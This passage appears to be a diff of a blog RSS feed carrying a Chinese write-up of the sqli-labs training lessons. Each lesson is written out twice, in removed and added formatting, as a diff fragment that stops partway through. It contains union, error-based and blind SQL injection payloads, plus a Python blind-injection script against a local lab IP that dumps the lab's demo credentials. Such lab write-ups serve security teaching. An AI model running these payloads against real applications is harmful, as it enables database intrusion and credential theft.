class=&#34;token keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;security&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;floor&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;x &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;less-12&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-12&#34;&gt;#&lt;/a&gt; less 12&lt;/h1&gt;
-&lt;p&gt;与 11 相比，闭合使用 &lt;code&gt;&#34;)&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;passwd=admin&amp;amp;uname=&#39; union select 1,database()--+
+passwd=admin&amp;amp;uname=&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)--+
+或者使用报错注入
+
+passwd=1&amp;amp;uname=1&#39; and updatexml(0x7e,concat(0x7e,database()),0x7e)--+
+或者
+passwd=1&amp;amp;uname=1&#39;union (select 1,2 from(select count(*),concat((select (select (select concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;less-12&#34;&gt;&lt;a href=&#34;#less-12&#34; class=&#34;headerlink&#34; title=&#34;less 12&#34;&gt;&lt;/a&gt;less 12&lt;/h1&gt;&lt;p&gt;与 11 相比，闭合使用&lt;code&gt;&#34;)&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;其他同&lt;/p&gt;
-&lt;h1 id=&#34;less-13&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-13&#34;&gt;#&lt;/a&gt; less 13&lt;/h1&gt;
-&lt;p&gt;闭合使用 &lt;code&gt;&#39;)&lt;/code&gt; ，使用报错注入，其他无显示&lt;/p&gt;
+&lt;h1 id=&#34;less-13&#34;&gt;&lt;a href=&#34;#less-13&#34; class=&#34;headerlink&#34; title=&#34;less 13&#34;&gt;&lt;/a&gt;less 13&lt;/h1&gt;&lt;p&gt;闭合使用&lt;code&gt;&#39;)&lt;/code&gt;，使用报错注入，其他无显示&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -103,43 +150,84 @@
             <category>CTF</category>
             <category>sql注入</category>
             <pubDate>Fri, 23 Sep 2022 00:07:26 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;less-1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-1&#34;&gt;#&lt;/a&gt; less 1&lt;/h1&gt;
-&lt;p&gt;输入 id 值，测试为字符型注入 (此处注释符不能用  &lt;code&gt;#&lt;/code&gt;  ，可用  &lt;code&gt;--+&lt;/code&gt;  )&lt;/p&gt;
-&lt;p&gt;然后使用  &lt;code&gt;order by x&lt;/code&gt; ，确认列数，为  &lt;code&gt;3&lt;/code&gt;  列 然后传入&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-1&#39; union select 1,2,3--+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;确定输入位置，分别为 2 和 3&lt;/p&gt;
+            <description><![CDATA[ &lt;h1 id=&#34;less-1&#34;&gt;&lt;a href=&#34;#less-1&#34; class=&#34;headerlink&#34; title=&#34;less 1&#34;&gt;&lt;/a&gt;less 1&lt;/h1&gt;&lt;p&gt;输入 id 值，测试为字符型注入 (此处注释符不能用 &lt;code&gt;#&lt;/code&gt; ，可用 &lt;code&gt;--+&lt;/code&gt; ) &lt;/p&gt;
+&lt;p&gt;然后使用 &lt;code&gt;order by x&lt;/code&gt;，确认列数，为 &lt;code&gt;3&lt;/code&gt; 列 然后传入&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;-1&#39; union select 1,2,3--+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;确定输入位置，分别为 2 和 3&lt;/p&gt;
 &lt;p&gt;之后正常爆库、表、列&lt;/p&gt;
-&lt;h1 id=&#34;less-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-2&#34;&gt;#&lt;/a&gt; less 2&lt;/h1&gt;
-&lt;p&gt;输入 id，测试为整型注入，之后操作同 less 1&lt;/p&gt;
-&lt;h1 id=&#34;less-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-3&#34;&gt;#&lt;/a&gt; less 3&lt;/h1&gt;
-&lt;p&gt;输入 id，纯数字，无报错，加上一个单引号，报错&lt;/p&gt;
+&lt;h1 id=&#34;less-2&#34;&gt;&lt;a href=&#34;#less-2&#34; class=&#34;headerlink&#34; title=&#34;less 2&#34;&gt;&lt;/a&gt;less 2&lt;/h1&gt;&lt;p&gt;输入 id，测试为整型注入，之后操作同 less 1&lt;/p&gt;
+&lt;h1 id=&#34;less-3&#34;&gt;&lt;a href=&#34;#less-3&#34; class=&#34;headerlink&#34; title=&#34;less 3&#34;&gt;&lt;/a&gt;less 3&lt;/h1&gt;&lt;p&gt;输入 id，纯数字，无报错，加上一个单引号，报错&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;0&#39;&#39;) LIMIT 0,1&#39; at line 1&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;可判断为字符型注入，且有括号，之后操作如前&lt;/p&gt;
-&lt;h1 id=&#34;less-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-4&#34;&gt;#&lt;/a&gt; less 4&lt;/h1&gt;
-&lt;p&gt;此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可&lt;/p&gt;
-&lt;h1 id=&#34;less-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-5&#34;&gt;#&lt;/a&gt; less 5&lt;/h1&gt;
-&lt;p&gt;此题输入 id=1，发现返回的是 You are in...&lt;/p&gt;
-&lt;p&gt;可以推断这题使用 bool 盲注，substr，length (),left 之类的函数使用，或者可以用时间盲注&lt;/p&gt;
+&lt;h1 id=&#34;less-4&#34;&gt;&lt;a href=&#34;#less-4&#34; class=&#34;headerlink&#34; title=&#34;less 4&#34;&gt;&lt;/a&gt;less 4&lt;/h1&gt;&lt;p&gt;此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可&lt;/p&gt;
+&lt;h1 id=&#34;less-5&#34;&gt;&lt;a href=&#34;#less-5&#34; class=&#34;headerlink&#34; title=&#34;less 5&#34;&gt;&lt;/a&gt;less 5&lt;/h1&gt;&lt;p&gt;此题输入 id=1，发现返回的是 You are in… &lt;/p&gt;
+&lt;p&gt;可以推断这题使用 bool 盲注，substr，length (),left 之类的函数使用，或者可以用时间盲注 &lt;/p&gt;
 &lt;p&gt;ascii 可以换 ord&lt;/p&gt;
-&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Author       : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;since        : 2022-08-20 16:05:07&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LastAuthor   : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lastTime     : 2022-08-20 16:31:08&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;blog         : http://dpm12345.cn/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;email        : 1006975692@qq.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://192.168.47.132:5000/sqli-labs/Less-5/?id=1&#39; and ascii(substr({},{},1))={}--+&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;target &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;#&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    i &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;(select group_concat(schema_name)from information_schema.schemata)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# information_schema,challenges,mysql,performance_schema,security,test&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;database()&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# security&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# emails,referers,uagents,users&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# #id,username,password&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;uagents&#39;)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# #id,uagent,ip_address,username&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;(select group_concat(id,0x7e,username,0x7e,password)from security.users)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    target &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;target&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;You are in&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            result &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# security&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# emails,referers,uagents,users&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;less-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-6&#34;&gt;#&lt;/a&gt; less 6&lt;/h1&gt;
-&lt;p&gt;与 less5 相比，单引号改为双引号&lt;/p&gt;
-&lt;h1 id=&#34;less-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-7&#34;&gt;#&lt;/a&gt; less 7&lt;/h1&gt;
-&lt;p&gt;相比上一个，起 sql 语句应为  &lt;code&gt;where id = ((&#39;$id&#39;))&lt;/code&gt;  ，故闭合一个单引号和两个括号，之后和前面脚本一样&lt;/p&gt;
-&lt;h1 id=&#34;less-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-8&#34;&gt;#&lt;/a&gt; less 8&lt;/h1&gt;
-&lt;p&gt;同 less 5&lt;/p&gt;
-&lt;h1 id=&#34;less-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-9&#34;&gt;#&lt;/a&gt; less 9&lt;/h1&gt;
-&lt;p&gt;不管什么都显示相同，故采用时间盲注&lt;/p&gt;
-&lt;p&gt;payload： &lt;code&gt;?id=1&#39; and if(ascii(substr({},{},1))={},sleep(1),2)--+&lt;/code&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-10&#34;&gt;#&lt;/a&gt; less 10&lt;/h1&gt;
-&lt;p&gt;第九题改单引号为双引号&lt;/p&gt;
-&lt;h1 id=&#34;less-11&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-11&#34;&gt;#&lt;/a&gt; less 11&lt;/h1&gt;
-&lt;p&gt;联合查询&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;&#39;&#39;&#39;
+Author       : zhong
+since        : 2022-08-20 16:05:07
+LastAuthor   : zhong
+lastTime     : 2022-08-20 16:31:08
+blog         : http://dpm12345.cn/
+email        : 1006975692@qq.com
+&#39;&#39;&#39;
+import requests
+
+url = &#34;http://192.168.47.132:5000/sqli-labs/Less-5/?id=1&#39; and ascii(substr({},{},1))={}--+&#34;
+
+target = &#34;&#34;
+result = &#34;#&#34;
+i = 0
+while True:
+    i += 1
+    # target = &#34;(select group_concat(schema_name)from information_schema.schemata)&#34;
+    # information_schema,challenges,mysql,performance_schema,security,test
+    # target = &#34;database()&#34;
+    # security
+    # target = &#34;(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)&#34;
+    # emails,referers,uagents,users
+    # target = &#34;(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)&#34;
+    # #id,username,password
+    # target = &#34;(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;uagents&#39;)&#34;
+    # #id,uagent,ip_address,username
+    # target = &#34;(select group_concat(id,0x7e,username,0x7e,password)from security.users)&#34;
+    # #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4
+    target = &#34;(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)&#34;
+    if i &amp;gt; len(result):
+        break
+    for j in range(33, 128):
+        str = chr(j)
+        print(str)
